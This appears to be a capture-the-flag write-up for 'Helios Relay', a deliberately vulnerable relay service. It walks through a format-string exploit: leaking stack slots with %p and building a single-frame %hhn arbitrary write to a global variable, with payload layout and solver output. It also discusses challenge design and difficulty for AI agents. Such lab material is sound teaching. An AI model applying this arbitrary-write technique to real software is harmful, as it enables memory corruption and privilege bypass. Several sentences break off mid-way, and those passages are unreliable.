# Helios Relay — solution

Run commands from this challenge's title directory. Python dependencies, when needed, are in `solution/requirements.txt`.

```bash
python solution/solve.py --local challenge/helios_relay
```

`accepted_flags.txt` records the accepted event answers. Locally reproduced services use their source defaults unless a flag is supplied through the documented environment variable; those demo answers can differ from the event answer.

# Helios Relay — Writeup

**Category:** pwn · **Band:** Hard · **Flag:** `zerosecurectf{...}` (from `ZSCTF_FLAG`)

---


## 1. The service

`helios_relay` is a solar-array telemetry relay. The control loop accepts a few
plaintext commands plus one length-framed payload command:

```
RENDER <len>\n<len raw bytes>
```

The framed payload is an operator-supplied *label template*. The relay copies
the raw frame (verbatim, zero bytes and all) into an on-stack buffer and renders
it:

```c
fputs("[relay] rendered label: ", stdout);
printf(buffer);          /* buffer is attacker-controlled */
```

The template is passed as the **first and only** argument to `printf`, so the
template *is* the format string. There are no benign conversion arguments behind
it — every `%` directive the renderer processes consumes whatever happens to sit
in the argument registers and then on the stack.

The win condition is a single global:

```c
#define PROVISIONING_SEAL 0x5A534331u      /* 'Z''S''C''1' little-endian */
volatile unsigned int authorization_level = 0;
...
if (authorization_level == PROVISIONING_SEAL) { unlock_control_plane(); /* prints flag */ }
else if (authorization_level != 0) { /* relatch to LOCKED */ authorization_level = 0; }
```

`unlock_control_plane()` reads `ZSCTF_FLAG` from the environment and prints it.


## 2. Why the easy ideas fail

- **"Just leak the flag with `%s`/`%p`."** The flag is never on the stack, in the
  binary, or in any global — it is pulled from `getenv` only inside the unlock
  routine. Walking the stack never produces it.
- **"Set the word to any non-zero value."** The `else if` branch is a tripwire:
  any value other than the exact seal is relatched to `LOCKED`. Confirmation-bias
  bait for anyone who assumes "nonzero == admin" (that is literally how the
  lineage source behaved — see §6).
- **"Write one byte per request."** Because the tripwire fires after *every*
  frame, a partial value (e.g. `0x00000031`) is wiped before the next frame. The
  full 32-bit seal must land inside a **single** `printf` call.
- **"Point `%n` at the global by typing its address in a text line."** `.bss`
  addresses contain NUL bytes. A newline-terminated text reader truncates at the
  first NUL, so the address never fully lands. This is why the relay takes a
  length-framed payload — which is exactly what makes the real write possible.


## 3. The intended exploit

### 3a. Recover the target address (reasoning handle, not a guess)

The binary is built `-no-pie -fno-pic`, so the global has a fixed load address.
The operator is given the source and the exact build recipe, so the address is
recoverable from the ELF symbol table:

```console
$ readelf -sW helios_relay | grep authorization_level
   45: 00000000004040ac  4 OBJECT GLOBAL DEFAULT 26 authorization_level
```

We must write the four little-endian bytes of `0x5A534331` to
`0x4040ac .. 0x4040af`:

| address    | byte |
|------------|------|
| `0x4040ac` | `0x31` (49)  |
| `0x4040ad` | `0x43` (67)  |
| `0x4040ae` | `0x53` (83)  |
| `0x4040af` | `0x5A` (90)  |

### 3b. Find where our frame lands on the stack

The frame buffer sits on the stack; its position (as a `printf` argument index)
is perturbed per instance (see §5), so we discover it at run time. Send a known
8-byte marker followed by a `%p` walk and see which slot echoes it:

```
RENDER 128
AAAAAAAA.%p.%p.%p. ... (×40)
```

```
[relay] rendered label: AAAAAAAA.0x48.0x7fff....0x4141414141414141.0x....
                                                 ^ slot 10 == our buffer start
```

The slot that prints `0x4141414141414141` is the argument index of our buffer's
first 8 bytes. Call it `off`.

### 3c. Single-frame four-byte write

Layout the frame as `[directives][space pad to 64][addr0 addr1 addr2 addr3]`:

- The directive region is padded to a **fixed 64 bytes** (8 slots), so the four
  8-byte addresses begin at argument index `off + 8`, with `addr_i` at
  `off + 8 + i`. No circular dependency between index widths and offsets.
- The directives drive the printed-character counter up to each target byte
  value (ascending) and fire `%hhn` at the matching address slot:

```
%49c%<off+8>$hhn        # counter -> 49,  write low byte of counter to addr0
%18c%<off+9>$hhn        # counter -> 67,  ...                        addr1
%16c%<off+10>$hhn       # counter -> 83,  ...                        addr2
%7c%<off+11>$hhn        # counter -> 90,  ...                        addr3
```

- The four addresses are placed **after** all directives. Their NUL bytes only
  terminate `printf`'s *format parsing* at the very end — by then every `%hhn`
  has already executed, reading its target pointer straight off the stack (the
  positional read grabs 8 raw bytes regardless of NULs). The length-framed
  `RENDER` command is what lets those NUL-containing addresses reach the stack
  intact.

All four byte-writes happen in one `printf`, so `authorization_level` is only
observed by the control loop *after* it already equals the seal — the tripwire
never sees a partial value. `unlock_control_plane()` runs and prints the flag.

### 3d. Run the reference solver

```console
$ python3 solution/solve.py --local ./helios_relay
[*] authorization_level @ 0x4040ac
[*] provisioning seal = 0x5a534331
[*] discovered stack arg offset = 10
[+] control plane unlocked
[+] FLAG = zerosecurectf{...}
```

`solution/solve.py` is stdlib-only (no pwntools): it resolves the symbol with
`readelf`/`nm`, auto-discovers `off`, builds the payload, and parses the flag,
over either a spawned stdio process (`--local`) or a TCP socket (`--remote`).


## 4. The decoys (§7)

Two bounded, clearly-rejectable dead ends:

1. **`DIAG` maintenance token.** Prints
   `zerosecurectf{just_a_maintenance_sticker_not_the_seal}` — a flag-shaped
   string that is *not* the flag and unlocks nothing. The service even says so.
2. **The tripwire.** Any authorisation value except the seal is relatched to
   `LOCKED` with a visible `[tripwire]` message. This rejects the "any nonzero
   value wins" hypothesis and forces the exact-value, single-frame write.

value neither unlocks nor leaks.


## 5. Per-instance variation (ZSCTF_SEED / ZSCTF_FLAG)

- **`ZSCTF_FLAG`** is the flag, read live from the environment, never on disk or
  in an image layer. A leaked flag from one team does not transfer.
- **`ZSCTF_SEED`** seeds an FNV-1a hash that selects `0..7` extra 8-byte scratch
  slots in the render frame (a VLA), shifting the template buffer's argument
  offset per team (observed `off` ∈ {10, 12, 16, …}). An exploit that *hard-codes*
  another team's offset misaligns; the intended solver, which discovers the
  solver wins under several distinct seeds and that a fixed seed is reproducible.


## 6. Lineage (system.html §17)

- **Source:** `snchakri/zerosecurectf2026_challenges ::
  binary_exploitation/ch3_echo_chamber` ("Echo Chamber"). Read for concept only;
  no code copied. It is a `printf`-on-user-input bug whose banner *prints*
  `&is_admin`, whose vulnerable `printf` is *handed* `&is_admin` as explicit
  arguments, and which wins on `is_admin == 1337`.
- **Corpus genome seeds:** `zsctf-anchor-001` (format-string arbitrary write as a
  reservoir primitive) and `zsctf-pwn-006` ("one_byte": amplify a narrow write).
- **§17 operators applied:**
  - **RESKIN (context re-skin):** echo terminal → Helios Grid Edge solar
    telemetry relay.
  - **GROUND (authenticity lift):** reframed as a plausible templated-logging
    feature (operator-defined label templates), the real-world home of CWE-134.
  - **CONSTRAIN:** removed every crutch the source provided (no leaked address,
    no handed pointer arguments), added the per-seal tripwire (forces a
    single-frame multi-byte write), and switched to a NUL-preserving length-framed
    input (makes embedding `.bss` addresses necessary *and* possible). Added
    per-instance offset jitter.

### What changed vs. the source

| aspect | source (Echo Chamber) | this challenge (Helios Relay) |
|---|---|---|
| scenario | legacy echo terminal | solar telemetry relay |
| target address | printed in banner | **not** disclosed; recover from ELF symbol |
| printf args | `&is_admin` handed in ×4 | none — pure `printf(buffer)` |
| win value | `is_admin == 1337` | `authorization_level == 0x5A534331` |
| write | trivial `%n` via supplied pointer | self-staged **4× `%hhn`**, single frame |
| input | newline text line (NUL-truncated) | length-framed `RENDER` (NUL-preserving) |
| wrong value | guard reset (same idea) | tripwire relatch (now a real obstacle) |
| decoy | `DECOY` prints fake flags | `DIAG` token + tripwire |
| per-instance | none | `ZSCTF_SEED` offset jitter + `ZSCTF_FLAG` |
| flag | `ZeroSecure_CTF{echo_in_silence}` | `zerosecurectf{...}` from env |


## 7. Honest red-team / AI-resistance

**Band: Hard — and honestly so, with caveats.**

- **What keeps it from "easy":** no address is leaked and no pointer is handed to
  the formatter (both of which trivialised the source); the NUL-byte problem must
  be understood and solved via the framed-input channel; the tripwire forbids
  byte-at-a-time staging, forcing a correct single-frame four-byte write with
  run-time offset discovery. That is four coupled sub-steps, each with a concrete
  reasoning handle (no guessing).
- **What keeps it from "insane":** it is a single-stage, full-source,
  no-mitigation (no ASLR on the target global, no stack canary, NX irrelevant
  since we never execute injected code) format-string write. A capable human or a
  competent LLM agent that knows the `%hhn` arbitrary-write pattern will likely
  solve it in well under an hour. We do **not** claim it resists a strong agent;
  the lineage source is a known-public pattern, so contamination risk is real
  (§14 schedules a post-release re-test). The honest difficulty lever here is the
  stack of obstacles, not novelty — novelty is deliberately low (2/5).
- **AI-specific friction we added (bounded, fair):** the confirmation-bias
  tripwire punishes the most common first-reflex ("make it nonzero"); the
  NUL-byte truncation punishes the naive "type the address in a line" reflex; the
  per-instance offset punishes copy-paste of a leaked payload. None of these
  introduce guessiness — each failure prints a message that points at the correct
  constraint.
- **Unintended-solution scan.** (a) The flag is not reachable by reads (not on
  never leak it. (b) The tripwire blocks the "partial write" shortcut — asserted.
  (c) `RENDER` length is bounded `1..511`; out-of-range and non-numeric lengths
  are rejected — asserted. (d) The buffer is a fixed `char[512]` written by a
  bounded `memcpy`, so there is no stack-smash / return-address path; the only
  intended primitive is the format string. (e) No shell, no `system`, no file
  I/O — the win is purely the global compare.
- **Residual risks we are not hiding:** a solver who never reads the source and
  never runs `readelf` could flail (the address is "hidden" only in the sense of
  requiring one standard tool); and glibc's exact stack layout can differ across
  libc versions, which is why the solver *discovers* the offset rather than
  hard-coding it (validated on Ubuntu glibc 2.39 and Debian bookworm glibc 2.36).


## 8. Reproduction / testing

```bash
# build + full acceptance suite (Linux host with gcc + glibc; or inside the container)

# deploy and solve over TCP
docker run -d --rm -e ZSCTF_SEED=team1 -e ZSCTF_FLAG='zerosecurectf{...}' -p 1337:1337 zsctf-helios-relay
python3 solution/solve.py --remote 127.0.0.1 1337 --bin ./helios_relay
```

containerised instance solved remotely returns exactly the injected
`ZSCTF_FLAG`.
